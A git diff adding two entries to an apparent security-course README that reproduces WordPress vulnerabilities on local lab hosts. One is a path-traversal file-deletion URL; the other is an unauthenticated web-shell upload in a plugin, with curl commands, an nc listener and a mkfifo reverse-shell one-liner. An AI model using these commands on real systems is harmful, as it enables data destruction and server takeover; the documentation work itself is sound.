@@ -74,6 +74,49 @@ Time spent: **27+** hours spent in total
   - [ ] Affected source code:
     - [/tags/4.9.6/src/wp-admin/includes/ajax-actions.php](https://core.trac.wordpress.org/browser/tags/4.9.6/src/wp-admin/includes/ajax-actions.php)
 
+4. WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities
+  - [ ] Summary: 
+    - Vulnerability types: Directory traversal/IDOR
+    - <a href="https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/" target="_blank">Detailed description</a>
+    - Tested in version: 4.2
+    - Fixed in version: 4.9.8
+    ![GIF Walkthrough](./img/4.gif)
+  - [ ] Steps to recreate: 
+     - Choose a plugin
+     - Click on "Deactivate" and "Delete" buttons
+     - Replace plugin location with target directory in the url.
+        Example: ```http://localhost/wp-admin/plugins.php?action=delete-selected&checked[0]=../../../../var/www/.&plugin_status=all&paged=1&s&_wpnonce=1154979245```
+     - Click on "Yes delete these files"
+  - [ ] Affected source code:
+    - [tags/4.9.8/src/wp-admin/plugins.php](https://core.trac.wordpress.org/browser/tags/4.9.8/src/wp-admin/plugins.php)
+
+5. Wordpress Work the flow file upload 2.5.2 Shell Upload Vulnerability
+  - [ ] Summary: 
+    - Vulnerability types: Arbitrary Code Execution
+    - <a href="https://www.exploit-db.com/exploits/36640/" target="_blank">Detailed description</a>
+    - Tested in version: 4.2
+    - Fixed in version: N/A
+    - Plugin version: <a href="./plugins_repo/work-the-flow-file-upload.2.5.2.zip" target="_blank">2.5.2</a>
+    - Plugin fixed version: plugin deleted from wordpress repository
+    ![GIF Walkthrough](./img/5.gif)
+  - [ ] Steps to recreate: 
+     - Install the <a href="./plugins_repo/work-the-flow-file-upload.2.5.2.zip" target="_blank">plugin</a>
+     - Unauthenticated user can upload the <a href="./shell_scripts/shell.php" target="_blank">shell script</a> by running this code 
+     ```bash
+     curl -k -X POST -F "action=upload" -F "files=@./shell.php" http://wpdistillery.vm/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
+     ```
+     - Unauthenticated user can run shell scripts on the server.
+        Example: (Taken from: https://blaksec.com/index.php?title=DerpNStink:_1_~_VulnHub_-_Walkthrough#Exploitation)
+     ```bash
+     curl http://wpdistillery.vm/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/shell.php?cmd=hostname
+     
+     nc -lt -p 4444
+     
+     curl -G "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php" --data-urlencode "cmd=rm -f /tmp/backpipe; mkfifo /tmp/backpipe; cat /tmp/backpipe | /bin/sh -i 2>&1|nc 192.168.56.203 4444 >/tmp/backpipe"
+     ```
+  - [ ] Affected source code:
+    - [tags/4.2/src/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php]("./plugins_repo/index.php")
+
 ## Assets
 
 List any additional assets, such as scripts or files
